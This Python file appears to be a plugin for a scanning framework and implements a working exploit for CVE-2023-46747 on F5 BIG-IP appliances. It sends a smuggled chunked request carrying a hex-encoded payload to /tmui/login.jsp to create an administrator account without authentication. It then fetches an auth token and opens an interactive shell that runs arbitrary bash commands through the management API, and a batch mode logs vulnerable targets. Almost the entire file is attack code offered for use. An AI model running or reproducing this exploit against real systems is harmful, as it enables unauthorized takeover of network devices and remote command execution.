#!/user/bin/env python3
# -*- coding: utf-8 -*-
import binascii
import json
import random
import time
import urllib3
import requests
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
urllib3.disable_warnings()


class Cve_2023_46747:
    def generatesth(self, num):
        charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
        return ''.join(random.choice(charset) for _ in range(num))

    def unauth_create_user(self, target, username, password, proxy):
        login_request_hex = "0008485454502f312e310000122f746d75692f436f6e74726f6c2f666f726d0000093132372e302e302e310000096c6f63616c686f73740000096c6f63616c686f7374000050000003000b546d75692d44756262756600000b424242424242424242424200000a52454d4f5445524f4c450000013000a00b00096c6f63616c686f73740003000561646d696e000501715f74696d656e6f773d61265f74696d656e6f775f6265666f72653d2668616e646c65723d253266746d756925326673797374656d25326675736572253266637265617465262626666f726d5f706167653d253266746d756925326673797374656d253266757365722532666372656174652e6a737025336626666f726d5f706167655f6265666f72653d26686964654f626a4c6973743d265f62756676616c75653d65494c3452556e537758596f5055494f47634f4678326f30305863253364265f62756676616c75655f6265666f72653d2673797374656d757365722d68696464656e3d5b5b2241646d696e6973747261746f72222c225b416c6c5d225d5d2673797374656d757365722d68696464656e5f6265666f72653d266e616d653d" + binascii.hexlify(
            username.encode()).decode() + "266e616d655f6265666f72653d267061737377643d" + binascii.hexlify(
            password.encode()).decode() + "267061737377645f6265666f72653d2666696e69736865643d782666696e69736865645f6265666f72653d00ff00"
        login_data = b"204\r\n" + binascii.unhexlify(login_request_hex) + b"\r\n0\r\n\r\n"
        url = f"{target}/tmui/login.jsp"
        headers = {
            "User-Agent": self.headers,
            "Content-Type": "application/x-www-form-urlencoded",
            "Transfer-Encoding": "chunked, chunked"
        }
        try:
            resp = requests.post(url=url, headers=headers, data=login_data, verify=self.ssl, proxies=proxy)
            time.sleep(5)
            if resp.status_code == 200:
                return True
            else:
                return False
        except:
            return False

    def get_token(self, target, user, passwd, proxy):
        url = f"{target}/mgmt/shared/authn/login"
        headers = {
            "User-Agent": self.headers,
            "Content-Type": "application/json"
        }
        target_json = {
            "username": user,
            "password": passwd
        }
        try:
            resp = requests.post(url=url, headers=headers, json=target_json, verify=self.ssl, proxies=proxy)
            time.sleep(5)
            if resp.status_code == 200:
                return json.loads(resp.content.decode())["token"]["token"]
            else:
                return ""
        except:
            return ""

    def exec_command(self, target, token, cmd, proxy):
        url = f"{target}/mgmt/tm/util/bash"
        headers = {
            "User-Agent": self.headers,
            "X-F5-Auth-Token": token
        }
        cmd_json = {
            "command": "run",
            "utilCmdArgs": f"-c \"{cmd}\""
        }
        try:
            resp = requests.post(url=url, headers=headers, json=cmd_json, verify=self.ssl, proxies=proxy)
            if resp.status_code == 200:
                return json.loads(resp.content.decode())["commandResult"].replace("\\n", "")
            else:
                return ""
        except:
            return ""

    def exploit(self, t, proxy):
        u = self.generatesth(5)
        p = self.generatesth(12)
        if not self.batch:
            print(f"\033[94m[*] start to attack: {t}\033[0m")
        if self.unauth_create_user(t, u, p, proxy):
            if not self.batch:
                print(
                    f"\033[94m[*] It seems that the user may have been successfully created without authorization and is trying to obtain a token to verify.\033[0m")
            token = self.get_token(t, u, p, proxy)
            if token != "":
                if not self.batch:
                    print(f"\033[92m[+] username: [{u}], password: [{p}], token: [{token}].\033[0m")
                    print("\033[94m[*] start executing commands freely~\033[0m")
                else:
                    OutPrintInfo("BigIP",f"目标存在漏洞 {t}")
                    OutPutFile("bigip_2023_46747.txt",f"目标存在漏洞 {t}")
                if not self.batch:
                    time.sleep(2)
                    while True:
                        c = input("CVE-2023-46747-RCE@W01fh4cler# ")
                        if c != "":
                            result = self.exec_command(t, token, c, proxy)
                            if result != "":
                                print(result)
                            else:
                                print(
                                    f"\033[91m[-] username: [{u}], password: [{p}], command: [{c}],  token: [{token}]. The command [{c}] failed to execute, Please try again!\033[0m")
                        else:
                            continue

            else:
                if not self.batch:
                    print(f"\033[91m[-] username: [{u}], password: [{p}]. Failed to obtain token!\033[0m")
        else:
            if not self.batch:
                print("\033[91m[-] There are no vulnerabilities in this site.\033[0m")

    def main(self, target):
        self.batch = target["batch_work"]
        banner = """
      ______     _______     ____   ___ ____  _____       _  _    __ _____ _  _ _____ 
     / ___\ \   / / ____|   |___ \ / _ \___ \|___ /      | || |  / /|___  | || |___  |
    | |    \ \ / /|  _| _____ __) | | | |__) | |_ \ _____| || |_| '_ \ / /| || |_ / / 
    | |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____|__   _| (_) / / |__   _/ /  
     \____|  \_/  |_____|   |_____|\___/_____|____/         |_|  \___/_/     |_|/_/   
                                                                                Author: W01fh4cker
                                                                                Blog: https://w01fh4cker.github.io
        """
        if not self.batch:
            print(banner)
        url = target["url"].strip('/ ')
        self.headers = target["header"]
        proxy = target["proxy"]
        self.ssl = target["ssl"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        self.exploit(url, self.proxy)